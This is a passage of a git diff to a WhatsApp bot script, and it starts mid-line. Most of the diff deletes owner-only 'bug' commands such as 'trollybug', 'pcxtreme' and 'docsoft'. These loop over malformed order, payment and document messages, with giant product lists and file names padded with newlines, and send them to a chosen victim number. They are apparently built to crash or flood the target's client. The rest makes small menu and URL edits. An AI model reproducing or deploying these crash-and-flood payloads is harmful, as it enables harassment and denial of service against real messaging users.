roductId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});QueenNilu['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
-}
-}
-break
-
-case 'trollybug': {
-
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-a = await QueenNilu.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${botname}`,jpegThumbnail: thumb}}}
-var xeonoporwot = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-"orderMessage": {
-"orderId": "599519108102353",
-"thumbnail": xpicvirus,
-"itemCount": 1999,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"message": ownername,
-"orderTitle": wm, // 
-"sellerJid": " 916909137213@s.whatsapp.net",
-"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
-}
-}), { userJid: m.chat, quoted: doc })
-QueenNilu.relayMessage(m.chat, xeonoporwot.message, { messageId: xeonoporwot.key.id })
-}
-}
-break
-case 'pcxtreme': {
-
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909137213s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
-num = q.split('|')[0]
-amount = q.split('|')[1]
-for (let i = 0; i < amount; i++) {
-var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: QueenNilu.waUploadToServer })
-var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
-"requestPaymentMessage": {
-"currencyCodeIso4217": "INR",
-"amount1000": "100",
-"extendedTextMessage": {
-"text": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
-}
-}}), { userJid: m.chat, quoted: doc})
-QueenNilu.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
-}
-reply(`Success in Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
-}
-break
-
-case 'docfuck': {
-
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(q)}`
-ydd = `${ownername}`
-for (let i = 0; i < amount; i++) {
-brutaltarget = fs.readFileSync('./XBug/cumshot.xeon')
-QueenNilu.sendMessage(m.chat, {document: brutaltarget, mimetype: 'application/octet-stream', fileName:`${ownername} ${xeonbutton2}.xeon` }, {quoted:doc})
-}
-}
-break
-
-case 'docsoft': {
-
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(q)}`
-ydd = `${ownername}`
-for (let i = 0; i < amount; i++) {
-var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-"documentMessage": {
-"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
-"mimetype": "",
-"title": "${botname}",
-"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
-"pageCount": 0,
-"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
-"fileName": `${ownername}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbutton2}.xeon`,
-"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
-"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
-"mediaKeyTimestamp": "1658703206",
-}
-}), { userJid: m.chat })
-QueenNilu.relayMessage(m.chat, document.message, { messageId: document.key.id })
-}
-}
-break
-
-case 'docsoft2': {
-
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(q)}`
-ydd = `${ownername}`
-for (let i = 0; i < amount; i++) {
-var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-"documentMessage": {
-"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
-"mimetype": "*/*",
-"title": "IMG-20220802-WA0052.jpeg",
-"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
-"pageCount": 0,
-"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
-"fileName": `${ownername}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${xeonbutton2}.jpeg`,
-"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
-"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
-"mediaKeyTimestamp": "1659416157",
-}
-}), { userJid: m.chat })
-QueenNilu.relayMessage(m.chat, document.message, { messageId: document.key.id })
-}
-}
-break
-
-case 'huehuex': {
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-let user = global.db.data.users[m.sender]
-user.afkTime = + new Date
-user.afkReason = text
-reply(`🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot ${m.pushName} ${text ? ': ' + text : ''}`)
-}
-break
-  case 'not_for_use_xxxxxxxxxxxxwkwkwk':{
-           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-if (args.length == 0) return reply(`amount?\nExample: ${prefix}charbug 3`)
-amount = `${encodeURI(q)}`
-for (let i = 0; i < amount; i++) {
-let unicornXeonxD = { 
-key: { 
-fromMe: false, 
-participant: `0@s.whatsapp.net`, 
-...({ remoteJid: "" }) 
-}, 
-message: { 
-"imageMessage": { 
-"mimetype": "image/jpeg", 
-"caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`, 
-"jpegThumbnail": thumb
-} 
-} 
-}
-QueenNilu.sendText(m.chat, `Janiya☣️`, text, {quoted: unicornXeonxD})
-}
-}
-break
-case 'textshot': {
-	           	
-                if (!isCreator) return m.reply(`${mess.owner}`)
-                let user = global.db.data.users[m.sender]
-                user.afkTime = + new Date
-                user.afkReason = text
-                reply(`${m.pushName} Janiya☣️${text ? ': ' + text : ''}`)
-            }
-            break
-//------------------------The End----------------------\\
-			
-//---------------------------------------ALIVE-----------------------------
-
+//-----------------ALIVE-----------------------------\\
+ 
 
 case 'alive': case 'bot':{  
     // Push Message To Console && Auto Read
@@ -9030,7 +8174,7 @@ QueenNilu.readMessages([m.key])
 
    // await QueenNilu.sendReadReceipt(from, m.sender, [m.key.id])
              await QueenNilu.sendPresenceUpdate('recording', m.chat) 
-             await QueenNilu.sendMessage(m.chat, { audio: {url :'https://github.com/ragonxjanith/UPLOADS/raw/main/VOICE/nilu.mp3'}, mimetype: 'audio/mp4', ptt: true }, { quoted: m }) 
+             await QueenNilu.sendMessage(m.chat, { audio: {url :'https://github.com/dragonxjanith/UPLOADS/raw/main/VOICE/nilu.mp3'}, mimetype: 'audio/mp4', ptt: true }, { quoted: m }) 
  if (global.alive === 'default') {
  const ita = '```'
  await QueenNilu.sendMessage(from, { react: { text: `👋`, key: m.key }})
@@ -9275,7 +8419,7 @@ case 'menu': {
   
   ${JSMSG}
   
-  ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
+  ​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
   ╭──❰ *𝙳𝙾𝚆𝙽𝙻𝙾𝙰𝙳 𝙲𝙾𝙼𝙼𝙰𝙽𝙳𝚂* ❱
   │ ${prefix}tiktok
   │ ${prefix}tiktok2
@@ -9495,7 +8639,7 @@ case 'menu': {
   │ ${prefix}technology
   ╰─────────────⦁`
   const templateButtons = [
-    {buttonId: `panel`, buttonText: {displayText: 'ʟɪsᴛ ᴍᴇɴᴜ'}, type: 1},{buttonId: `owner`, buttonText: {displayText: 'ᴏᴡɴᴇʀ‍️'}, type: 1},
+    {buttonId: `panel`, buttonText: {displayText: 'ʟɪsᴛ ᴍᴇɴᴜ'}, type: 1}, {buttonId: `owner`, buttonText: {displayText: 'ᴏᴡɴᴇʀ‍️'}, type: 2},
     {buttonId: `owner`, buttonText: {displayText: 'ᴏᴡɴᴇʀ‍️'}, type: 1},
     {buttonId: `stetus`, buttonText: {displayText: 'sᴛᴇᴛᴜs'}, type: 1}
   
